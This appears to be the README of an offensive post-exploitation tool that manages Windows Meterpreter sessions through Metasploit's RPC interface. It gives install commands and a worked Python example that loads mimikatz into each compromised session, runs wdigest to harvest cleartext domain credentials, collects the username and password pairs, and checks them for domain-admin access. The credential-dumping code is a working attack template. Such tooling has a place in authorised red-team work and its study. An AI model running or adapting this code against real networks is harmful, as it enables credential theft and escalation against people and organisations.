async-meterpreter-controller
------
Waits for a windows meterpreter shell then lets you asynchronously do whatever you want with it.

#### Installation
This install is only tested on Kali. Clone into the repo, enter the cloned folder and run install.sh. Open a new terminal and start metasploit with the included rc file. Back in the original terminal continue by entering the newly-created virtual environment with pipenv. Finally, enter the included msfrpc/ folder and install it now that you're inside the virtual environment.

```
git clone https://github.com/DanMcInerney/async-meterpreter-controller
cd async-meterpreter-controller
In a new terminal: msfconsole -r msfrpc.rc
pipenv install --three
pipenv shell
cd msfrpc && python2 setup install && cd ..
./async-meterpreter-controller.py
```

#### Usage
```./async-meterpreter-controller.py```

#### How to extend
By default all the script does is run `sysinfo`, `getuid`, and windows/post/gather/win_privs then prints all the shell info to the console. All session data is being stored in the global NEW_SESS_DATA dictionary. To extend the template and send commands and get output from each meterpreter session you'll want to go to line 340. Here's an example of how you'd run mimikatz on each session. This code is called on 342 and the function resides at 302:

```
async def run_mimikatz(client, sess_num):
    global DOMAIN_DATA
    load_mimi_cmd = 'load mimikatz'
    load_mimi_end_strs = [b'Success.', b'has already been loaded.']
    load_mimi_output, err = await run_session_cmd(client, sess_num, load_mimi_cmd, load_mimi_end_strs)
    if err:
        return
    wdigest_cmd = 'wdigest'
    wdigest_end_str = [b'    Password']
    mimikatz_output, err = await run_session_cmd(client, sess_num, wdigest_cmd, wdigest_end_str)
    if err:
        return 
    else:
        mimikatz_split = mimikatz_output.splitlines()
        for l in mimikatz_split:
            if l.startswith(b'0;'):
                line_split = l.split()
                dom = line_split[2]
                if dom.lower() == NEW_SESS_DATA[sess_num][b'domain'].lower():
                    user = '{}\{}'.format(dom.decode('utf8'), line_split[3].decode('utf8'))
                    password = line_split[4]
                    if b'wdigest KO' not in password:
                        user_and_pass = '{}:{}'.format(user, password.decode('utf8'))
                        if user_and_pass not in DOMAIN_DATA['creds']:
                            DOMAIN_DATA['creds'].append(user_and_pass)
                            print_good(msg, sess_num)
                            check_for_DA(user_and_pass)
```
